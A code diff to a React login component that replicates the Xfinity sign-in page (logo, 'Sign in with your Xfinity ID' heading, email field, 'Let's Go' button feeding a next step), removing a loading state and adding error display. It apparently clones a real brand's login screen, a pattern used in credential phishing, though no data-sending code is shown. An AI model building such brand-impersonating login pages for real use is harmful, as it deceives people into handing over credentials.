@@ -1,26 +1,18 @@
 import React, { useState } from 'react';
 import Xfinity from '../assets/Xfinity.png';
 import logo from '../assets/logo.png';
-import bottom from '../assets/bottom.png';
 
-const LoginPage = ({ formData, handleChange, handleNext }) => {
-  const [loading, setLoading] = useState(false); // Add loading state
-
-  const handleButtonClick = async () => {
-    setLoading(true); // Set loading to true
-    await handleNext(); // Call the next step
-    setLoading(false); // Reset loading state
-  };
+const LoginPage = ({ formData, handleChange, handleNext, errors}) => {
 
   return (
     <div className="flex flex-col md:flex-row h-screen">
       {/* Left section */}
       <div className="flex flex-col bg-white w-full md:w-1/2 px-6 sm:px-10 md:px-32 py-10 sm:py-14 md:py-28">
         {/* Logo */}
-        <img src={logo} alt="Xfinity" className="w-16 sm:w-20 md:w-24 mb-6" />
+        <img src={logo} alt="Xfinity" className="w-16 sm:w-20 md:w-16 mb-6" />
 
         {/* Sign-in form */}
-        <h1 className="text-xl sm:text-2xl md:text-3xl font-bold mb-4">
+        <h1 className="text-xl sm:text-2xl md:text-2xl font-bold mb-4">
           Sign in with your Xfinity ID
         </h1>
         <div className="flex flex-col">
@@ -33,9 +25,11 @@ const LoginPage = ({ formData, handleChange, handleNext }) => {
             aria-label="Email, mobile, or username" // Accessibility
             className="border border-gray-300 rounded-lg p-3 w-full mb-4 focus:outline-none focus:ring-2 focus:ring-purple-600"
           />
+          {errors.email && <span className="text-red-500 text-sm -mt-2">{errors.email}</span>}
+          
         </div>
 
-        <p className="text-sm sm:text-base text-gray-500 mb-4">
+        <p className="text-sm sm:text-base text-gray-500 mb-4 mt-4">
           By signing in, you agree to our{' '}
           <a href="#" className="text-purple-600">
             Terms of Service
@@ -48,24 +42,17 @@ const LoginPage = ({ formData, handleChange, handleNext }) => {
 
         {/* Button with loader effect */}
         <button
-          onClick={handleButtonClick}
+          onClick={handleNext}
           type="button"
           className="bg-[#5a23b9] text-white py-4 px-2 rounded-md hover:bg-[#411987] mb-4 w-full sm:w-28"
-          disabled={loading} // Disable button while loading
+          
         >
-          {loading ? 'Loading...' : "Let's Go"} {/* Loader text */}
+        Let's Go
         </button>
 
         {/* Additional links */}
         <div className="flex flex-col gap-4 text-sm sm:text-base text-black py-8 sm:py-14">
-          <div className="border-b border-black md:w-[400px] py-4 bg-transparent hover:bg-gray-100 cursor-pointer">
-            <p className="md:px-2 text-[16px]">
-              New to Xfinity?{' '}
-              <a href="#" className="text-black">
-                View exclusive offers near you
-              </a>
-            </p>
-          </div>
+          
 
           <div className="border-b border-black md:w-[400px] py-4 bg-transparent hover:bg-gray-100 cursor-pointer text-[16px] relative">
             <a href="#" className="text-black px-2">
@@ -94,11 +81,7 @@ const LoginPage = ({ formData, handleChange, handleNext }) => {
           alt="Xfinity Mobile Devices"
           className="h-40 md:h-screen absolute object-contain right-0 hidden md:block"
         />
-        <img
-          src={bottom}
-          alt=""
-          className="w-40 md:w-[629.5px] absolute bottom-0 object-contain right-0 hidden md:block"
-        />
+       
       </div>
     </div>
   );
